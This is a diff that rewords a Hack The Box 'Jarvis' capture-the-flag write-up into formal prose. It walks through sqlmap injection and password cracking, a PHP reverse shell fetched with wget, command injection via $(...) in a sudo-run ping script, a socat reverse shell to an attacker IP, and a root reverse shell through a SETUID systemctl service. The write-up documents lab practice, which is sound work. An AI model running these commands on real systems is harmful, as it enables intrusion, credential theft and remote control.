@@ -21,8 +21,8 @@ nmap reveals a very limited port selection:
 ```
 
 The web page on port 80 is a php site with not much at the first glance.  
-On port 64999 you'll get a blank page with "Hey you have been banned for 90 seconds, don't be bad" on the first call. Interesting.  
-Let's get the gobuster warmed up!
+On port 64999 you'll get a blank page with "Hey you have been banned for 90 seconds, don't be bad" on the first call.  
+As a preliminary investigation, gobuster is used to find additional content on the webserver.
 
 ## Gobuster port 80
 ```
@@ -41,54 +41,38 @@ Let's get the gobuster warmed up!
 /server-status (Status: 403)
 ```
 
-Huh. The site reacts weird if you play around with the Room Booking (http://10.10.10.143/room.php?cod=1) soooo... sqlmap to the rescue!
+Exploring the website leads to weird reactions if the Room Booking (http://10.10.10.143/room.php?cod=1) is manipulated with. Guessing from these results and the URL schema, a closer inspection of SQL Injection capabilities was concluded.
 
 
-## SQLMap all ze things!
-
+## SQLMap
+Running SQLmap with the dump parameter yields to successful execution.
 `sqlmap -u http://10.10.10.143/room.php?cod=2 --dump`
 
-That works like a charm. So let's see if we can dump passwords from the db :3  
-
-`sqlmap -u http://10.10.10.143/room.php?cod=2 --passwords` aaaaaaand success!  
+As a next step, a password dump is attempted with *rockyou.txt* as dictionary file:
+`sqlmap -u http://10.10.10.143/room.php?cod=2 --passwords`
+which is successful:  
 
 ```
 [10:43:12] [INFO] the back-end DBMS is MySQL
 web server operating system: Linux Debian 9.0 (stretch)
 web application technology: PHP, Apache 2.4.25
 back-end DBMS: MySQL >= 5.0.12
-[10:43:12] [INFO] fetching database users password hashes
-[10:43:12] [INFO] used SQL query returns 1 entry
-[10:43:12] [INFO] used SQL query returns 1 entry
-do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
-[10:43:18] [INFO] writing hashes to a temporary file '/tmp/sqlmapQV5_6528897/sqlmaphashes-wQNuZc.txt' 
-do you want to perform a dictionary-based attack against retrieved password hashes? [Y/n/q] y
-[10:43:22] [INFO] using hash method 'mysql_passwd'
-what dictionary do you want to use?
-[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
-[2] custom dictionary file
-[3] file with list of dictionary files
-> 2
-what's the custom dictionary's location?
-> /usr/share/wordlists/rockyou.txt
-[10:44:00] [INFO] using custom dictionary
+(...)
 [10:44:04] [INFO] starting dictionary-based cracking (mysql_passwd)
 [10:44:04] [INFO] starting 2 processes 
-[10:44:04] [INFO] cracked password 'imissyou' for user 'DBadmin'                                                                                                     
-[10:45:16] [INFO] current status: nutju... -^C
-[10:45:16] [WARNING] user aborted during dictionary-based attack phase (Ctrl+C was pressed)
+[10:44:04] [INFO] cracked password 'imissyou' for user 'DBadmin'                                                                   (...)
 database management system users password hashes:                                                                                                                    
 [*] DBadmin [1]:
     password hash: *2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
     clear-text password: imissyou
 ```
-So with that, we could log in into the phpMyAdmin, right? But wait, sqlmap can do so much more.  
+With these credentials, loggin into phpMyAdmin is possible. As SQLMap is also able to spawn shells under certain circumstances, this is worth trying as well:  
 `sqlmap -u http://10.10.10.143/room.php?cod=2 --os-shell`  
-aaaaand we got ourselves a shell as `www-data`. By looking around a bit, we learn that the target user is named `pepper`.  
+which yields a shell as `www-data`. By looking around a bit, we learn that the target OS user is named `pepper`.  
 Also, there's an interesting script in `/var/www/Admin-Utilities`, it's `simpler.py`.  
-Let's get that file:  
+Again, with SQLMap, this file can be downloaded:  
 `sqlmap -u http://10.10.10.143/room.php?cod=2 --file-read=/var/www/Admin-Utilities/simpler.py`
-Looks like the script does something in the user home. I wonder if there's some sudo config that allows me to run it as user?
+On closer inspection, the script seems to execute actions in the user home folder of pepper. As this script is executed as *www-data*, there must be a sudo entry to run it as *pepper*. This can be confirmed by running `sudo -l`:  
 `sqlmap -u http://10.10.10.143/room.php?cod=2 --os-cmd="sudo -l"`  
 ```
 Matching Defaults entries for www-data on jarvis:
@@ -97,12 +81,11 @@ Matching Defaults entries for www-data on jarvis:
 User www-data may run the following commands on jarvis:
     (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
 ```
-And we're reaching the limits of the sqlmap console, because to do something interesting with the Python script,  
-we need an interactive session. So fire up a python http server and wget the `apalaxsh.php` from this dir to `www-data`.  
-Fire up nc with `nc -nvlp 9999`, open your browser and point it to `/apalaxsh.php` and voila - shell.  
+At this point, a switch to a fully interactive session is needed. This can be archieved by running a local webserver on the attacker machine and serving a prepared PHP reverse shell (*apalaxsh.php*) that is downloaded via `wget` or `curl` to the target systems web dir (www-data).
+With a running netcat receiver on the attacker machine (`nc -nvlp 9999`), the shell is triggered by pointing a browser to `/apalaxsh.php`, which yields a shell.
 
 ## Road to user
-Now we can play around with the full script as user pepper:  
+Now the script can be further examined in its native run environment as sudoed user:  
 `sudo --user=pepper /var/www/Admin-Utilities/simpler.py`  
 
 This [article on Infoblox Shell Escape](https://packetstormsecurity.com/files/144749/Infoblox-NetMRI-7.1.4-Shell-Escape-Privilege-Escalation.html) provides some ideas on how to escape via sudo/ping:  
@@ -112,26 +95,26 @@ $ sudo --user=pepper /var/www/Admin-Utilities/simpler.py -p
 
 Enter an IP: $(cat /home/pepper/user.txt)
 
-ping: 2afa36c4f05b37b34259c93551f5c44f: Temporary failure in name resolution
+ping: 2afa36c4f05b37b34259[...]]: Temporary failure in name resolution
 ```
-
-but not only that. By upgrading the shell to a full interactive shell first (`python -c 'import pty; pty.spawn("/bin/sh")'`),  
+which yields the user flag.  
+But this is not everything this shell can do. By upgrading the shell to a full interactive shell first (`python -c 'import pty; pty.spawn("/bin/sh")'`),  
 we're able to spawn a shell as pepper:  
 ```
 sudo --user=pepper /var/www/Admin-Utilities/simpler.py -p
 
 Enter an IP: $(/bin/bash)
 $(/bin/bash)
-pepper@jarvis:/$ ^^
+pepper@jarvis:/$ 
 ```
-This shell isn't perfectly working, so we're upgrading to a full reverse shell. Fire up nc on port 8989 and  
+This shell isn't perfectly working, so it is upgraded to a full reverse shell. With nc running on port 8989, this command yields a fully functioning shell:  
 `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.15.195:8989`
-So let's continue. 
+
 
 
 ## Road to root  
-So by poking around we find that systemctl has the SETUID bit set. That means that it runs under root!  
-We could pin together a systemctl oneshot service to reverse shell out as root...  
+Exploring privilege escalation routes, it turns out that systemctl has the *SETUID* bit set, meaning it can run with root privileges.
+Creating a systemctl oneshot service that spawns a reverse shell as root is therefore possible:
 ```
 [Unit]
 Description=Black magic happening, avert your eyes
@@ -146,7 +129,7 @@ WantedBy=default.target
 ```
 Then make use of systemctl link to link the service file into the correct position:  
 `systemctl link /home/pepper/apalax.service`
- and enable it, therefore opening the connection to port 8888 on our Machine:  
+and enable it, therefore opening the connection to port 8888 on our Machine:  
 `systemctl start --now apalax`  
 
-The shell's ugly but it works. `cat /root/root.txt` works like a charm.
+This spawns a minimal shell that is functioning enough to print the contents of `root.txt`.
